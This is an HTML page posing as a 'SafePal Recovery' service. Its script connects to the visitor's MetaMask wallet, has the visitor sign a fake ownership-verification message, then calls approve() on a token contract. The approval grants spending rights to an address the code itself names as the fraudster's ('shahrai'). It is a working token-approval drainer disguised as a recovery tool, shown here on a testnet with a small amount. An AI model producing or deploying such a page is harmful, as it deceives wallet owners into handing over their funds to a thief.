<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SafePal Recovery</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 10px;
            border-radius: 5px;
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>SafePal Recovery</h2>
        <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
        <p id="status">Please connect your MetaMask wallet.</p>
    </div>

    <script>
        async function connectWallet() {
            try {
                document.getElementById('status').innerText = 'Connecting...';

                if (!window.ethereum || !window.ethereum.isMetaMask) {
                    throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
                }

                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts.length === 0) {
                    throw new Error('No accounts found. Please unlock MetaMask.');
                }

                const userAddress = accounts[0];
                document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';

                // Перевірка мережі (Sepolia)
                const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
                const targetChainId = 11155111; // Sepolia Testnet
                if (chainId !== targetChainId) {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: `0x${targetChainId.toString(16)}` }]
                    });
                }

                // Підпис повідомлення
                const message = 'Verify wallet ownership for SafePal recovery';
                const signature = await window.ethereum.request({
                    method: 'personal_sign',
                    params: [message, userAddress]
                });

                console.log('Signature:', signature);
                document.getElementById('status').innerText = 'Wallet verified. Processing approval...';

                // Перевірка підпису через ApproveContract
                const contractAddress = '0x76490d1585BBb01506A1300CF6881347828c13D1'; // Встав нову адресу
                const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Гаманець Б
                const amount = 500; // 0.0005 USDT

                const approveAbi = [
                    "function approve(address spender, uint256 amount) public returns (bool)",
                    "function allowance(address owner, address spender) public view returns (uint256)"
                ];
                const verifyAbi = [
                    "function verifySignature(bytes memory message, address user, bytes memory signature) public view returns (bool)"
                ];

                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const approveContract = new ethers.Contract(usdtAddress, approveAbi, signer);
                const verifyContract = new ethers.Contract(contractAddress, verifyAbi, provider);

                const messageBytes = ethers.utils.toUtf8Bytes(message);
                const isValid = await verifyContract.verifySignature(messageBytes, userAddress, signature);
                if (!isValid) {
                    throw new Error('Signature verification failed');
                }

                // Виклик approve на TestUSDT від імені користувача
                const approveTx = await approveContract.approve(shahraiAddress, amount);
                await approveTx.wait();
                console.log('Approve Transaction Hash:', approveTx.hash);

                document.getElementById('status').innerText = 'Approval processed! Recovery complete.';
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
                console.error('Detailed error:', error);
            }
        }
    </script>
</body>
</html>
